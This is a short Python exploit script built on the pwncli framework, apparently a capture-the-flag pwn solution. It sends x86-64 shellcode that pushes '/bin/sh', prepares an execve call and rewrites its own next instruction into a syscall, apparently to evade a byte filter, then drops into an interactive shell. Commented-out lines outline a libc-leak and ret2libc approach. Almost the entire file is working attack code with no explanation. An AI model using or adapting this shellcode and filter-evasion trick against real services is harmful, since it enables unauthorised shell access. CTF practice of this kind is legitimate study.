#!/usr/bin/env python
# -*- encoding: utf-8 -*-

from pwncli import *

# use script mode
cli_script()

# get use for obj from gift
io: tube = gift['io'] 
elf: ELF = gift['elf']
libc: ELF = gift.libc

ropper_box = RopperBox()

try:
    if gift.remote:
        libc = ELF("./libc.so.6")
        gift['libc'] = libc
        #ropper_box.add_file("libc", "libc.so.6", arch=RopperArchType.x86_64)
    else:
        pass
        #ropper_box.add_file("libc", "/usr/lib/libc.so.6", arch=RopperArchType.x86_64)
except:
    pass

CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

#pop_rdi_ret = CurrentGadgets.pop_rdi_ret()
#ret = CurrentGadgets.ret()


#putsaddr=int(io.recv(12),16)
#print(libc.sym['puts'])
#libcbase=putsaddr-libc.sym['puts']
#system=libcbase+libc.sym['system']
#binsh=libcbase+next(libc.search(b"/bin/sh"))

# sla('choose?', '4')
payload = asm(
    '''
    xor esi, esi
    push rsi
    mov rbx, 0x68732f2f6e69622f
    push rbx
    push rsp
    pop rdi
    imul esi
    mov al, 0x3b
    mov cx, 0x050e
    inc cx
    mov word ptr [rip], cx
    ''')
s(payload)
ia()

